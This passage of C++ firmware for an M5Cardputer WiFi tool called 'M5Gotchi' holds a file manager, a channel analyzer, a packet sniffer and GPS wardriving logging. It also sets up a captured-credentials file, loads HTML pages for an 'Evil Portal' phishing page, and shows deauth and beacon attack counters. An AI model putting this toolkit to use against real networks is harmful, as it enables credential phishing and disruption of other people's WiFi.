            File file = SD.open(CREDS_FILE, FILE_WRITE);
            if (file) {
                file.println("=== M5Gotchi Captured Credentials ===");
                file.close();
                Serial.println("       📝 Created " + String(CREDS_FILE));
            }
        }
    } else {
        sdCardAvailable = false;
        if (millis() >= timeout) {
            Serial.println("    ⏱️  SD Card timeout (no card detected)");
        } else {
            Serial.println("    ❌ SD Card initialization failed!");
        }
    }
}

void scanDirectory(String path) {
    fileList.clear();
    selectedFile = 0;
    fileListScroll = 0;
    
    if (!sdCardAvailable) {
        fileList.push_back("[SD Card Error]");
        return;
    }
    
    File root = SD.open(path);
    if (!root || !root.isDirectory()) {
        fileList.push_back("[Invalid Directory]");
        return;
    }
    
    // Adicionar opção de voltar se não estiver na raiz
    if (path != "/") {
        fileList.push_back("../");
    }
    
    File file = root.openNextFile();
    while (file) {
        String name = String(file.name());
        if (file.isDirectory()) {
            fileList.push_back(name + "/");
        } else {
            long size = file.size();
            String sizeStr;
            if (size < 1024) {
                sizeStr = String(size) + "B";
            } else if (size < 1024 * 1024) {
                sizeStr = String(size / 1024) + "KB";
            } else {
                sizeStr = String(size / (1024 * 1024)) + "MB";
            }
            fileList.push_back(name + " [" + sizeStr + "]");
        }
        file = root.openNextFile();
    }
    
    if (fileList.size() == 0) {
        fileList.push_back("[Empty Directory]");
    }
}

void startFileManager() {
    currentMode = MODE_FILE_MANAGER;
    scanDirectory(currentDir);
    drawFileManager();
}

// REFATORADO: Usa DisplayHelper para renderização organizada
void drawFileManager() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("File Manager");

    // Mostrar path atual (truncado se necessário)
    String displayPath = currentDir;
    if (displayPath.length() > 30) {
        displayPath = "..." + displayPath.substring(displayPath.length() - 27);
    }
    char pathInfo[50];
    snprintf(pathInfo, sizeof(pathInfo), "Dir: %s", displayPath.c_str());
    DisplayHelper::drawText(pathInfo, 4, 16, themeColors.primary);

    // Mostrar arquivos (6 por vez)
    int maxVisible = 6;
    int startIdx = fileListScroll;
    int endIdx = min(startIdx + maxVisible, (int)fileList.size());

    for (int i = startIdx; i < endIdx; i++) {
        int y = 32 + (i - startIdx) * 14;
        bool isSelected = (i == selectedFile);

        String displayName = fileList[i];
        if (displayName.length() > 28) {
            displayName = displayName.substring(0, 25) + "...";
        }

        uint32_t textColor = isSelected ? TFT_BLACK : themeColors.fg;
        uint32_t bgColor = isSelected ? TFT_GREEN : themeColors.bg;

        if (isSelected) {
            DisplayHelper::drawRect(0, y - 2, SCREEN_WIDTH, 14, bgColor);
        }
        DisplayHelper::drawText(displayName.c_str(), 4, y, textColor);
    }

    char filesInfo[30];
    snprintf(filesInfo, sizeof(filesInfo), "%d/%d files", selectedFile + 1, fileList.size());
    DisplayHelper::drawText(filesInfo, 4, SCREEN_HEIGHT - 24, themeColors.secondary);

    if (sdCardAvailable) {
        DisplayHelper::drawText("[Enter]Open [D]Delete [ESC]Back", 4, SCREEN_HEIGHT - 12, themeColors.secondary);
    } else {
        DisplayHelper::drawText("SD Card not available!", 4, SCREEN_HEIGHT - 12, themeColors.error);
    }
}

void updateFileManager() {
    // Nothing to update continuously
}

void deleteFile(String path) {
    if (!sdCardAvailable) return;
    
    if (SD.remove(path)) {
        Serial.println("🗑️ Deleted: " + path);
        M5.Display.clear(themeColors.bg);
        drawHeader("File Deleted");
        M5.Display.setTextColor(themeColors.success, themeColors.bg);
        M5.Display.setCursor(4, 40);
        M5.Display.println("File deleted!");
        delay(1000);
        scanDirectory(currentDir);
        drawFileManager();
    } else {
        Serial.println("❌ Failed to delete: " + path);
        M5.Display.clear(themeColors.bg);
        drawHeader("Error");
        M5.Display.setTextColor(themeColors.error, themeColors.bg);
        M5.Display.setCursor(4, 40);
        M5.Display.println("Cannot delete!");
        delay(1000);
        drawFileManager();
    }
}

void openFile(String filename) {
    String fullPath = currentDir;
    if (!currentDir.endsWith("/")) fullPath += "/";
    fullPath += filename;
    
    // Se for diretório, navegar
    if (filename.endsWith("/")) {
        if (filename == "../") {
            // Voltar um nível
            int lastSlash = currentDir.lastIndexOf('/', currentDir.length() - 2);
            if (lastSlash > 0) {
                currentDir = currentDir.substring(0, lastSlash + 1);
            } else {
                currentDir = "/";
            }
        } else {
            currentDir = fullPath;
        }
        scanDirectory(currentDir);
        drawFileManager();
        return;
    }
    
    // Se for arquivo HTML no diretório de portals, carregar como custom portal
    if (fullPath.endsWith(".html") || fullPath.endsWith(".htm")) {
        File file = SD.open(fullPath);
        if (file) {
            customPortalHTML = "";
            while (file.available()) {
                customPortalHTML += (char)file.read();
            }
            file.close();
            
            useCustomPortal = true;
            
            M5.Display.clear(themeColors.bg);
            drawHeader("Portal Loaded");
            M5.Display.setTextColor(themeColors.success, themeColors.bg);
            M5.Display.setCursor(4, 40);
            M5.Display.println("Custom portal loaded!");
            M5.Display.println();
            M5.Display.setTextColor(themeColors.fg, themeColors.bg);
            M5.Display.printf("Size: %d bytes\n", customPortalHTML.length());
            M5.Display.println("\nUse Evil Portal to deploy");
            
            Serial.println("📄 Custom portal loaded: " + fullPath);
            Serial.printf("Size: %d bytes\n", customPortalHTML.length());
            
            delay(2000);
            drawFileManager();
            return;
        }
    }
    
    // Visualizar conteúdo de arquivos texto
    File file = SD.open(fullPath);
    if (file) {
        M5.Display.clear(themeColors.bg);
        drawHeader(filename.substring(0, 20).c_str());
        M5.Display.setTextColor(themeColors.fg, themeColors.bg);
        M5.Display.setCursor(4, 18);
        
        int lines = 0;
        while (file.available() && lines < 8) {
            String line = file.readStringUntil('\n');
            if (line.length() > 38) {
                line = line.substring(0, 35) + "...";
            }
            M5.Display.println(line);
            lines++;
        }
        file.close();
        
        M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
        M5.Display.setCursor(4, SCREEN_HEIGHT - 12);
        M5.Display.println("[Any Key] Back");
        
        // Esperar tecla
        while (true) {
            M5.update();
            M5Cardputer.update();
            if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
                break;
            }
            delay(10);
        }
        
        drawFileManager();
    }
}

void stopFileManager() {
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== CHANNEL ANALYZER ====================
void startChannelAnalyzer() {
    currentMode = MODE_CHANNEL_ANALYZER;
    isAnalyzing = true;
    analyzeStartTime = millis();
    
    // Reset contadores
    for (int i = 0; i < 14; i++) {
        channelCount[i] = 0;
        channelMaxRSSI[i] = -100;
    }
    bestChannel = 1;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    Serial.println("📊 Channel Analyzer Started!");
    
    drawChannelAnalyzer();
}

// REFATORADO: Usa DisplayHelper para texto, mantém gráficos nativos
void drawChannelAnalyzer() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Channel Analyzer");
    
    // Scan rápido para popular dados
    if (isAnalyzing) {
        int n = WiFi.scanNetworks(false, false);
        for (int i = 0; i < n; i++) {
            uint8_t ch = WiFi.channel(i);
            if (ch >= 1 && ch <= 14) {
                channelCount[ch - 1]++;
                int rssi = WiFi.RSSI(i);
                if (rssi > channelMaxRSSI[ch - 1]) {
                    channelMaxRSSI[ch - 1] = rssi;
                }
            }
        }
        WiFi.scanDelete();
    }
    
    // Encontrar melhor canal (menos ocupado)
    int minCount = 999;
    for (int i = 0; i < 11; i++) { // Canais 1-11 (mais comuns)
        if (channelCount[i] < minCount) {
            minCount = channelCount[i];
            bestChannel = i + 1;
        }
    }
    
    // ===== ANIMATION: Bar Growth & Channel Hopping =====
    static int barAnimHeight[11] = {0};
    static int hoppingChannel = 1;
    static unsigned long lastHop = 0;
    static bool isScanning = false;
    static unsigned long scanStart = 0;
    
    if (isAnalyzing && !isScanning) {
        isScanning = true;
        scanStart = millis();
        for (int i = 0; i < 11; i++) barAnimHeight[i] = 0;
    }
    
    // Channel hopping indicator
    if (isAnalyzing && (millis() - lastHop > 80)) {
        hoppingChannel = (hoppingChannel % 11) + 1;
        lastHop = millis();
    }
    
    // Desenhar gráfico de barras
    int barWidth = 16;
    int maxHeight = 80;
    int maxNetworks = 0;
    
    // Encontrar máximo para escala
    for (int i = 0; i < 11; i++) {
        if (channelCount[i] > maxNetworks) {
            maxNetworks = channelCount[i];
        }
    }
    if (maxNetworks == 0) maxNetworks = 1;
    
    // Desenhar barras (apenas canais 1-11)
    for (int i = 0; i < 11; i++) {
        int x = 10 + i * (barWidth + 4);
        int targetHeight = (channelCount[i] * maxHeight) / maxNetworks;
        if (targetHeight < 2 && channelCount[i] > 0) targetHeight = 2;
        
        // Animate bar growth
        if (isScanning && barAnimHeight[i] < targetHeight) {
            barAnimHeight[i] += 4;
            if (barAnimHeight[i] > targetHeight) barAnimHeight[i] = targetHeight;
        } else if (!isAnalyzing) {
            barAnimHeight[i] = targetHeight;
        }
        
        int barHeight = barAnimHeight[i];
        int y = 105 - barHeight;
        
        // Heatmap colors (congestion-based)
        uint16_t color;
        float congestion = (float)channelCount[i] / maxNetworks;
        if (i + 1 == bestChannel) {
            color = TFT_GREEN;
        } else if (congestion > 0.8) {
            color = TFT_RED; // Heavy congestion
        } else if (congestion > 0.6) {
            color = TFT_ORANGE; // Moderate
        } else if (congestion > 0.3) {
            color = TFT_YELLOW; // Light
        } else {
            color = TFT_CYAN; // Clear
        }
        
        M5.Display.fillRect(x, y, barWidth, barHeight, color);
        
        // Channel hopping highlight
        if (isAnalyzing && (i + 1 == hoppingChannel)) {
            M5.Display.drawRect(x - 1, y - 1, barWidth + 2, barHeight + 2, TFT_WHITE);
            M5.Display.drawRect(x - 2, y - 2, barWidth + 4, barHeight + 4, TFT_YELLOW);
            // Scanning wave
            M5.Display.drawFastHLine(x - 5, y - 5, barWidth + 10, TFT_CYAN);
        }
        
        // Número do canal
        M5.Display.setTextColor(themeColors.fg, themeColors.bg);
        M5.Display.setCursor(x + 2, 108);
        M5.Display.setTextSize(1);
        if (i < 9) {
            M5.Display.printf("%d", i + 1);
        } else {
            M5.Display.setTextSize(1);
            M5.Display.printf("%d", i + 1);
        }
        
        // Contagem de redes
        if (channelCount[i] > 0) {
            M5.Display.setCursor(x, y - 10);
            M5.Display.setTextColor(themeColors.primary, themeColors.bg);
            M5.Display.printf("%d", channelCount[i]);
        }
    }
    
    // Stop animation after scan complete
    if (isScanning && (millis() - scanStart > 2000)) {
        isScanning = false;
    }
    
    // Info with congestion heatmap legend
    char totalInfo[40];
    snprintf(totalInfo, sizeof(totalInfo), "Total Networks: %d", maxNetworks);
    DisplayHelper::drawText(totalInfo, 4, 20, themeColors.fg);

    char bestChannelInfo[30];
    snprintf(bestChannelInfo, sizeof(bestChannelInfo), "Best Channel: %d", bestChannel);
    DisplayHelper::drawText(bestChannelInfo, 4, 30, themeColors.success);

    char channelCountInfo[30];
    snprintf(channelCountInfo, sizeof(channelCountInfo), " (%d networks)", channelCount[bestChannel - 1]);
    DisplayHelper::drawText(channelCountInfo, 110, 30, themeColors.primary);

    // Congestion legend
    DisplayHelper::drawText("Clear ", 4, 42, themeColors.primary);
    DisplayHelper::drawText("Light ", 34, 42, themeColors.secondary);
    DisplayHelper::drawText("Mod ", 64, 42, themeColors.warning);
    DisplayHelper::drawText("Heavy", 88, 42, themeColors.error);

    DisplayHelper::drawText("[SPACE]Rescan [ESC]Back", 4, SCREEN_HEIGHT - 12, themeColors.secondary);
}

void updateChannelAnalyzer() {
    // Rescan automático a cada 5 segundos
    static unsigned long lastScan = 0;
    if (isAnalyzing && millis() - lastScan > 5000) {
        drawChannelAnalyzer();
        lastScan = millis();
    }
}

void stopChannelAnalyzer() {
    isAnalyzing = false;
    WiFi.scanDelete();
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== PACKET MONITOR ====================
void packetMonitorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    totalPackets++;
    lastPacketTime = millis();
    
    switch (type) {
        case WIFI_PKT_MGMT: {
            mgmtPackets++;
            // Verificar se é beacon
            const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
            const uint8_t *payload = packet->payload;
            uint8_t frameType = (payload[0] & 0x0C) >> 2;
            uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
            if (frameType == 0 && frameSubtype == 8) { // Beacon
                beaconPackets++;
            }
            break;
        }
        case WIFI_PKT_DATA:
            dataPackets++;
            break;
        default:
            break;
    }
}

void startPacketMonitor() {
    currentMode = MODE_PACKET_MONITOR;
    isMonitoring = true;
    
    // Reset contadores
    beaconPackets = 0;
    dataPackets = 0;
    mgmtPackets = 0;
    totalPackets = 0;
    packetsPerSecond = 0;
    lastPacketTime = millis();
    
    // Iniciar promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(packetMonitorCallback);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    
    Serial.println("📡 Packet Monitor Started on Channel 6!");
    
    drawPacketMonitor();
}

// REFATORADO: Usa DisplayHelper para texto, mantém gráficos nativos
void drawPacketMonitor() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Packet Monitor");

    DisplayHelper::drawText("Channel: 6", 4, 20, themeColors.fg);
    
    // ===== ANIMATION: Flying Packets & Protocol Color Coding =====
    static int flyingPackets[5][3]; // x, y, type (0=beacon, 1=mgmt, 2=data)
    static unsigned long lastPacketAnim = 0;
    static int graphPoints[30] = {0}; // Real-time packet rate graph
    static int graphIndex = 0;
    
    // Add new flying packet periodically
    if (millis() - lastPacketAnim > 100 && isMonitoring) {
        for (int i = 0; i < 5; i++) {
            if (flyingPackets[i][0] <= 0) {
                flyingPackets[i][0] = 240; // Start from right
                flyingPackets[i][1] = 50 + random(-10, 10);
                flyingPackets[i][2] = random(0, 3); // Random packet type
                lastPacketAnim = millis();
                break;
            }
        }
    }
    
    // Update and draw flying packets
    for (int i = 0; i < 5; i++) {
        if (flyingPackets[i][0] > 0) {
            flyingPackets[i][0] -= 6; // Move left
            
            // Protocol color coding
            uint16_t packetColor;
            const char* symbol;
            switch (flyingPackets[i][2]) {
                case 0: packetColor = TFT_GREEN; symbol = "B"; break; // Beacon
                case 1: packetColor = TFT_YELLOW; symbol = "M"; break; // Management
                case 2: packetColor = TFT_MAGENTA; symbol = "D"; break; // Data
            }
            
            // Draw flying packet with arrow
            M5.Display.fillCircle(flyingPackets[i][0], flyingPackets[i][1], 3, packetColor);
            M5.Display.drawFastHLine(flyingPackets[i][0] + 4, flyingPackets[i][1], 6, packetColor);
            M5.Display.fillTriangle(
                flyingPackets[i][0] + 10, flyingPackets[i][1],
                flyingPackets[i][0] + 7, flyingPackets[i][1] - 2,
                flyingPackets[i][0] + 7, flyingPackets[i][1] + 2,
                packetColor
            );
            
            // Type label
            M5.Display.setTextColor(TFT_BLACK, packetColor);
            M5.Display.setCursor(flyingPackets[i][0] - 2, flyingPackets[i][1] - 3);
            M5.Display.print(symbol);
        }
    }
    
    // Update real-time graph
    static unsigned long lastGraphUpdate = 0;
    if (millis() - lastGraphUpdate > 200) {
        graphPoints[graphIndex] = packetsPerSecond;
        graphIndex = (graphIndex + 1) % 30;
        lastGraphUpdate = millis();
    }
    
    char totalInfo[40];
    snprintf(totalInfo, sizeof(totalInfo), "Total Packets: %lu", totalPackets);
    DisplayHelper::drawText(totalInfo, 4, 35, themeColors.primary);

    char beaconsInfo[30];
    snprintf(beaconsInfo, sizeof(beaconsInfo), "Beacons: %lu", beaconPackets);
    DisplayHelper::drawText(beaconsInfo, 4, 45, themeColors.success);

    char mgmtInfo[30];
    snprintf(mgmtInfo, sizeof(mgmtInfo), "Management: %lu", mgmtPackets);
    DisplayHelper::drawText(mgmtInfo, 4, 55, themeColors.secondary);

    char dataInfo[30];
    snprintf(dataInfo, sizeof(dataInfo), "Data: %lu", dataPackets);
    DisplayHelper::drawText(dataInfo, 4, 65, themeColors.primary);

    char rateInfo[30];
    snprintf(rateInfo, sizeof(rateInfo), "Rate: %d pkt/s", packetsPerSecond);
    DisplayHelper::drawText(rateInfo, 4, 80, themeColors.fg);
    
    // Real-time packet rate graph
    M5.Display.drawRect(3, 94, 234, 26, TFT_DARKGREY);
    int maxRate = 100;
    for (int i = 0; i < 30; i++) {
        int h = map(graphPoints[i], 0, maxRate, 0, 24);
        if (h > 24) h = 24;
        if (h > 0) {
            uint16_t color = TFT_GREEN;
            if (graphPoints[i] > 50) color = TFT_YELLOW;
            if (graphPoints[i] > 80) color = TFT_RED;
            M5.Display.drawFastVLine(5 + i * 7, 118 - h, h, color);
        }
    }
    
    // Barra de atividade
    int barWidth = (packetsPerSecond * 200) / 100; // Max 100 pkt/s
    if (barWidth > 200) barWidth = 200;
    if (barWidth > 0) {
        uint16_t color = TFT_GREEN;
        if (packetsPerSecond > 50) color = TFT_YELLOW;
        if (packetsPerSecond > 80) color = TFT_RED;
        M5.Display.fillRect(4, 122, barWidth, 6, color);
    }
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 12);
    M5.Display.println("[ESC]Stop");
}

void updatePacketMonitor() {
    // Calcular packets por segundo
    static unsigned long lastCalc = 0;
    static unsigned long lastCount = 0;
    
    if (isMonitoring && millis() - lastCalc > 1000) {
        packetsPerSecond = totalPackets - lastCount;
        lastCount = totalPackets;
        lastCalc = millis();
        drawPacketMonitor();
    }
}

void stopPacketMonitor() {
    isMonitoring = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    
    Serial.println("🛑 Packet Monitor Stopped");
    Serial.printf("Total captured: %lu packets\n", totalPackets);
    
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== GPS WARDRIVING ====================
void initGPS() {
    // Inicializa UART1 para GPS (NEO-6M/NEO-8M)
    gpsSerial.begin(GPS_BAUD, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);
    
    Serial.println("🛰️ Initializing GPS module...");
    delay(1000);
    
    // Testa se GPS responde
    unsigned long start = millis();
    bool gpsDetected = false;
    
    while (millis() - start < 3000) {
        while (gpsSerial.available() > 0) {
            char c = gpsSerial.read();
            if (gps.encode(c)) {
                gpsDetected = true;
                break;
            }
        }
        if (gpsDetected) break;
        delay(10);
    }
    
    if (gpsDetected) {
        gpsAvailable = true;
        Serial.println("✅ GPS module detected!");
        Serial.printf("Waiting for satellite fix (this may take 1-5 minutes)...\n");
    } else {
        gpsAvailable = false;
        Serial.println("⚠️ GPS module not detected, using coordinates 0,0");
    }
}

void updateGPSData() {
    if (!gpsAvailable) return;
    
    // Atualiza dados do GPS
    while (gpsSerial.available() > 0) {
        char c = gpsSerial.read();
        if (gps.encode(c)) {
            // Atualizar apenas a cada GPS_UPDATE_INTERVAL
            if (millis() - lastGPSUpdate >= GPS_UPDATE_INTERVAL) {
                lastGPSUpdate = millis();
                
                // Localização
                if (gps.location.isValid()) {
                    currentLat = gps.location.lat();
                    currentLon = gps.location.lng();
                    gpsFixed = true;
                } else {
                    gpsFixed = false;
                }
                
                // Altitude
                if (gps.altitude.isValid()) {
                    currentAlt = gps.altitude.meters();
                }
                
                // Velocidade
                if (gps.speed.isValid()) {
                    currentSpeed = gps.speed.kmph();
                }
                
                // Satélites
                if (gps.satellites.isValid()) {
                    gpsSatellites = gps.satellites.value();
                }
                
                // HDOP (Horizontal Dilution of Precision)
                if (gps.hdop.isValid()) {
                    gpsHDOP = gps.hdop.hdop();
                }
                
                // Debug GPS info
                if (gpsFixed) {
                    Serial.printf("GPS: Lat=%.6f Lon=%.6f Alt=%.1fm Sats=%d HDOP=%.2f Speed=%.1fkm/h\n",
                        currentLat, currentLon, currentAlt, gpsSatellites, gpsHDOP, currentSpeed);
                }
            }
        }
    }
    
    // Timeout de fix (se não receber dados válidos em 10s)
    if (gpsFixed && millis() - gps.location.age() > 10000) {
        gpsFixed = false;
        Serial.println("⚠️ GPS fix lost");
    }
}

void saveGPXTrackPoint() {
    if (!sdCardAvailable || !gpsFixed) return;
    
    // Criar arquivo GPX se não existir
    if (gpxPointCount == 0) {
        File file = SD.open(gpxTrackFile, FILE_WRITE);
        if (file) {
            file.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
            file.println("<gpx version=\"1.1\" creator=\"M5Gotchi Wardriving\"");
            file.println("  xmlns=\"http://www.topografix.com/GPX/1/1\"");
            file.println("  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"");
            file.println("  xsi:schemaLocation=\"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd\">");
            file.println("  <trk>");
            file.println("    <name>Wardriving Track</name>");
            file.println("    <trkseg>");
            file.close();
        }
    }
    
    // Adicionar ponto de track
    File file = SD.open(gpxTrackFile, FILE_APPEND);
    if (file) {
        // Timestamp ISO 8601 format
        unsigned long now = millis() / 1000;
        
        file.printf("      <trkpt lat=\"%.6f\" lon=\"%.6f\">\n", currentLat, currentLon);
        file.printf("        <ele>%.2f</ele>\n", currentAlt);
        file.printf("        <time>%lu</time>\n", now);
        file.printf("        <hdop>%.2f</hdop>\n", gpsHDOP);
        file.printf("        <sat>%d</sat>\n", gpsSatellites);
        file.println("      </trkpt>");
        file.close();
        
        gpxPointCount++;
        Serial.printf("📍 GPX point saved: #%d (%.6f, %.6f)\n", gpxPointCount, currentLat, currentLon);
    }
}

void startGPSWardriving() {
    currentMode = MODE_GPS_WARDRIVING;
    isWardriving = false;
    wifiLogged = 0;
    gpxPointCount = 0;
    wardrivingStartTime = millis();
    
    // Inicializa GPS
    initGPS();
    
    // Criar arquivo Wigle CSV
    if (sdCardAvailable) {
        File file = SD.open(wardrivingFile, FILE_WRITE);
        if (file) {
            file.println("WigleWifi-1.4,appRelease=1.0,model=M5Cardputer,release=1.0");
            file.println("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type");
            file.close();
        }
    }
    
    drawGPSWardriving();
    Serial.println("🛰️ GPS Wardriving Started!");
}

// REFATORADO: Usa DisplayHelper para texto, mantém animações nativas
void drawGPSWardriving() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("GPS Wardriving");

    int y = 20;

    // GPS Status com ícone animado
    const char* gpsStatus = gpsFixed ? "FIXED" : (gpsAvailable ? "SEARCHING" : "NO MODULE");
    uint32_t statusColor = gpsFixed ? TFT_GREEN : (gpsAvailable ? TFT_YELLOW : TFT_RED);

    char gpsInfo[50];
    snprintf(gpsInfo, sizeof(gpsInfo), "GPS: %s", gpsStatus);
    DisplayHelper::drawText(gpsInfo, 4, y, statusColor);
    
    // Satélite animado
    static int satFrame = 0;
    const char* satIcons[] = {"🛰️", "📡", "🛰️", "📶"};
    if (gpsAvailable) {
        M5.Display.setCursor(170, y);
        M5.Display.print(satIcons[satFrame % 4]);
        satFrame++;
    }
    
    y += 12;
    
    if (gpsAvailable) {
        // Signal strength bars
        char satsInfo[20];
        snprintf(satsInfo, sizeof(satsInfo), "Sats: %d", gpsSatellites);
        DisplayHelper::drawText(satsInfo, 4, y, themeColors.primary);
        
        // Animated signal bars
        int barX = 70;
        for (int i = 0; i < 4; i++) {
            int barHeight = 6 + i * 3;
            uint16_t barColor = (i < gpsSatellites / 3) ? TFT_GREEN : TFT_DARKGREY;
            if (gpsFixed && millis() % 500 < 250 && i == (gpsSatellites / 3) % 4) {
                barColor = TFT_YELLOW; // Blinking effect
            }
            M5.Display.fillRect(barX + i * 8, y + 12 - barHeight, 6, barHeight, barColor);
        }
        
        char hdopInfo[20];
        snprintf(hdopInfo, sizeof(hdopInfo), "HDOP: %.1f", gpsHDOP);
        DisplayHelper::drawText(hdopInfo, 120, y, themeColors.primary);

        y += 18;
        char latInfo[30];
        snprintf(latInfo, sizeof(latInfo), "Lat: %.6f", currentLat);
        DisplayHelper::drawText(latInfo, 4, y, themeColors.fg);

        y += 12;
        char lonInfo[30];
        snprintf(lonInfo, sizeof(lonInfo), "Lon: %.6f", currentLon);
        DisplayHelper::drawText(lonInfo, 4, y, themeColors.fg);

        y += 12;
        char altSpeedInfo[50];
        snprintf(altSpeedInfo, sizeof(altSpeedInfo), "Alt: %.1fm Speed: %.1fkm/h", currentAlt, currentSpeed);
        DisplayHelper::drawText(altSpeedInfo, 4, y, themeColors.fg);
        y += 12;
        
        // Radar scan animation
        if (isWardriving) {
            static float angle = 0;
            int radarX = 200;
            int radarY = 70;
            int radarR = 20;
            
            // Radar circle
            M5.Display.drawCircle(radarX, radarY, radarR, TFT_GREEN);
            M5.Display.drawCircle(radarX, radarY, radarR/2, TFT_DARKGREEN);
            
            // Scanning line
            int lineX = radarX + radarR * cos(angle);
            int lineY = radarY + radarR * sin(angle);
            M5.Display.drawLine(radarX, radarY, lineX, lineY, TFT_CYAN);
            angle += 0.1;
            if (angle > 6.28) angle = 0;
        }
    } else {
        DisplayHelper::drawText("GPS not connected", 4, y, themeColors.secondary);
        DisplayHelper::drawText("Logging at 0,0", 4, y + 12, themeColors.secondary);
        y += 24;
    }

    // Stats
    char networksInfo[30];
    snprintf(networksInfo, sizeof(networksInfo), "Networks: %d", wifiLogged);
    DisplayHelper::drawText(networksInfo, 4, y + 10, themeColors.fg);

    y += 22;
    char gpxInfo[30];
    snprintf(gpxInfo, sizeof(gpxInfo), "GPX Points: %d", gpxPointCount);
    DisplayHelper::drawText(gpxInfo, 4, y, themeColors.fg);

    y += 12;
    char statusInfo[30];
    snprintf(statusInfo, sizeof(statusInfo), "Status: %s", isWardriving ? "SCANNING" : "PAUSED");
    DisplayHelper::drawText(statusInfo, 4, y, themeColors.fg);

    // Controls
    DisplayHelper::drawText("[SPACE] Start/Stop", 4, SCREEN_HEIGHT - 30, themeColors.secondary);
    DisplayHelper::drawText("[S] Scan Now", 4, SCREEN_HEIGHT - 20, themeColors.secondary);
    DisplayHelper::drawText("[ESC] Back", 4, SCREEN_HEIGHT - 10, themeColors.secondary);
}

void updateGPSWardriving() {
    // Atualiza dados do GPS continuamente
    updateGPSData();
    
    if (!isWardriving) return;
    
    // Scan WiFi a cada 5 segundos
    static unsigned long lastScan = 0;
    if (millis() - lastScan > 5000) {
        lastScan = millis();
        
        // Salvar ponto GPX se GPS está fixado
        if (gpsFixed) {
            saveGPXTrackPoint();
        }
        
        int n = WiFi.scanNetworks();
        totalScans++;
        
        if (n > 0 && sdCardAvailable) {
            File file = SD.open(wardrivingFile, FILE_APPEND);
            if (file) {
                for (int i = 0; i < n; i++) {
                    // Formato Wigle CSV
                    String mac = WiFi.BSSIDstr(i);
                    String ssid = WiFi.SSID(i);
                    int rssi = WiFi.RSSI(i);
                    int channel = WiFi.channel(i);
                    String auth = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "WPA2";
                    
                    // Timestamp
                    unsigned long now = millis() / 1000;
                    
                    // Accuracy baseada em HDOP e fix status
                    float accuracy = gpsFixed ? (gpsHDOP * 5.0) : 0.0;
                    
                    // CSV: MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,Lat,Lon,Alt,Accuracy,Type
                    file.printf("%s,%s,%s,%lu,%d,%d,%.6f,%.6f,%.2f,%.1f,WIFI\n",
                        mac.c_str(), ssid.c_str(), auth.c_str(), now,
                        channel, rssi, currentLat, currentLon, currentAlt, accuracy);
                    
                    wifiLogged++;
                    totalAPsLogged++;
                }
                file.close();
            }
        }
        
        drawGPSWardriving();
    }
}

void stopGPSWardriving() {
    isWardriving = false;
    
    // Fechar arquivo GPX se foi criado
    if (gpxPointCount > 0 && sdCardAvailable) {
        File file = SD.open(gpxTrackFile, FILE_APPEND);
        if (file) {
            file.println("    </trkseg>");
            file.println("  </trk>");
            file.println("</gpx>");
            file.close();
            Serial.printf("📍 GPX track saved: %d points\n", gpxPointCount);
        }
    }
    
    Serial.printf("🛑 Wardriving stopped. Logged: %d networks\n", wifiLogged);
}

// ==================== STATISTICS ====================
void startStatistics() {
    currentMode = MODE_STATISTICS;
    drawStatistics();
}

// REFATORADO: Usa DisplayHelper para estatísticas organizadas
void drawStatistics() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Statistics Dashboard");

    // Session time
    unsigned long uptime = (millis() - sessionStartTime) / 1000;
    unsigned long hours = uptime / 3600;
    unsigned long minutes = (uptime % 3600) / 60;
    unsigned long seconds = uptime % 60;

    char sessionInfo[40];
    snprintf(sessionInfo, sizeof(sessionInfo), "Session: %02luh %02lum %02lus", hours, minutes, seconds);
    DisplayHelper::drawText(sessionInfo, 4, 20, themeColors.primary);

    // WiFi Statistics
    DisplayHelper::drawText("=== WiFi ===", 4, 35, themeColors.success);

    char scansInfo[20];
    snprintf(scansInfo, sizeof(scansInfo), "Scans: %lu", totalScans);
    DisplayHelper::drawText(scansInfo, 4, 45, themeColors.fg);

    char networksInfo[25];
    snprintf(networksInfo, sizeof(networksInfo), "Networks: %lu", totalNetworksFound);
    DisplayHelper::drawText(networksInfo, 100, 45, themeColors.fg);

    char loggedInfo[20];
    snprintf(loggedInfo, sizeof(loggedInfo), "Logged: %lu", totalAPsLogged);
    DisplayHelper::drawText(loggedInfo, 4, 53, themeColors.fg);

    // Attack Statistics with bar graphs
    DisplayHelper::drawText("=== Attacks ===", 4, 64, themeColors.error);

    // Deauth bar
    char deauthInfo[25];
    snprintf(deauthInfo, sizeof(deauthInfo), "Deauth: %lu", totalDeauthSent);
    DisplayHelper::drawText(deauthInfo, 4, 74, themeColors.fg);
    if (totalDeauthSent > 0) {
        int barLen = min(50, (int)(totalDeauthSent / 100));
        M5.Display.fillRect(120, 74, barLen, 6, themeColors.error);
    }
    
    // Beacon bar
    char beaconInfo[25];
    snprintf(beaconInfo, sizeof(beaconInfo), "Beacon: %lu", totalBeaconsSent);
    DisplayHelper::drawText(beaconInfo, 4, 82, themeColors.fg);
    if (totalBeaconsSent > 0) {
